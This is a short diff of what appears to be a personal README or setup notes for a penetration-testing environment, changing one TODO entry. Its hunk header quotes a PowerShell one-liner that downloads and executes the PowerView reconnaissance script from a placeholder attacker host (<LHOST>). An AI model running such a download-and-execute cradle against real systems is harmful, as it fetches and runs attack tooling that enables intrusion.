@@ -64,7 +64,7 @@ IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/win/powerview.ps1")
 
 ## TODOs
 
-- [BUG] nerdfont vs conky - locale?compare with VM
+- move cheats to a seperate repo
 
 ## Checkout
 Below are things I will get around to trying and will add them to the install script if I find them useful.
